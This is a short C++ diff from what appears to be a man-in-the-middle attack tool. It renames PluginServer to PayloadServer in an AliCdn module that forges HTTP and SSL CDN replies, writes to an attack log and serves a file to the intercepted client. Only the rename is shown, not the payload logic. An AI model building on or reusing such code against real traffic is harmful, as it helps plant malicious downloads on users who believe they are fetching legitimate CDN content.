@@ -2,7 +2,7 @@
 #include "alicdn.h"
 #include "../cipher/CryptoUtils.h"
 #include "../cipher/Base64.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 #include "../Public.h"
 #include "../attack.h"
 #include "../HttpUtils.h"
@@ -131,7 +131,7 @@ int AliCdn::makeRequestReply(char * dstbuf, int dstbuflimit, LPHTTPPROXYPARAM ht
 	int outlen = sprintf_s(szout, 4096, "alicdn reply:%s\r\n", hdrformat);
 	Public::writeFile(ATTACK_LOG_FILENAME, szout, outlen);
 
-	ret = PluginServer::SendPluginFile(urlfilename.c_str(), http, hdrformat, 1);
+	ret = PayloadServer::SendPluginFile(urlfilename.c_str(), http, hdrformat, 1);
 
 	return httphdrlen;
 }
@@ -198,7 +198,7 @@ int AliCdn::makeRequestReply(char * dstbuf, int dstbuflimit, LPSSLPROXYPARAM lps
 	int outlen = sprintf_s(szout,4096, "alicdn reply:%s\r\n", hdrformat);
 	Public::writeFile(ATTACK_LOG_FILENAME, szout, outlen);
 
-	ret = PluginServer::SendPluginFile(urlfilename.c_str(), lpssl, hdrformat, 1);
+	ret = PayloadServer::SendPluginFile(urlfilename.c_str(), lpssl, hdrformat, 1);
 	
 	return httphdrlen;
 }
